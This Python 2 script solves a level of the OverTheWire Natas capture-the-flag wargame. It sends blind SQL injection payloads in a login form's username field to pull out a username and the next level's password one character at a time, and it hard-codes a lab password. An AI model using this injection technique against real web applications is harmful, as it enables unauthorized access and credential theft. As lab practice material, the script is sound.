import urllib2
import urllib
import string

print

top_level = "http://natas17.natas.labs.overthewire.org/"

# proxyhand = urllib2.ProxyHandler({'http':'127.0.0.1:8080'})

passmgr = urllib2.HTTPPasswordMgrWithDefaultRealm()
passmgr.add_password(None, top_level, "natas17", "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw")
passhand = urllib2.HTTPBasicAuthHandler(passmgr)

# opener = urllib2.build_opener(proxyhand,passhand)
opener = urllib2.build_opener(passhand)

opener.addheaders = []
urllib2.install_opener(opener)

url = top_level + "index.php"

# p = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
p = ""
u = ""

# for i in range(1,1000):
# 	print i,
# 	params = {}
# 	params["username"] = "random\" or length((SELECT password from users where username='natas16'))="+str(i)+";#"
# 	req = urllib2.Request(url, data=urllib.urlencode(params))
# 	page = urllib2.urlopen(req).read()
# 	# print params["username"], page.count("exists")
# 	if (page.count("Error") == 1):
# 		print "Query error"
# 	if (page.count("This user exists.") == 1):
# 		length = i
# 		break

# print length

length = 32
for i in range(len(p)+1,length+1):
	for c in (string.digits + string.uppercase + string.lowercase):
		print c,
		params = {}
		params["username"] = "random\" or substr((SELECT username from users where '1'='1'),"+str(i)+",1)=BINARY('"+c+"');#"
		req = urllib2.Request(url, data=urllib.urlencode(params))
		page = urllib2.urlopen(req).read()
		# print params["username"], page.count("exists")
		if (page.count("Error") == 1):
			print "Query error"
		if (page.count("This user exists.") == 1):
			u += c
			print u
			break

length = 32
for i in range(len(p)+1,length+1):
	for c in (string.digits + string.uppercase + string.lowercase):
		print c,
		params = {}
		params["username"] = "random\" or substr((SELECT password from users where username='natas18'),"+str(i)+",1)=BINARY('"+c+"');#"
		req = urllib2.Request(url, data=urllib.urlencode(params))
		page = urllib2.urlopen(req).read()
		# print params["username"], page.count("exists")
		if (page.count("Error") == 1):
			print "Query error"
		if (page.count("This user exists.") == 1):
			p += c
			print p
			break

print
print p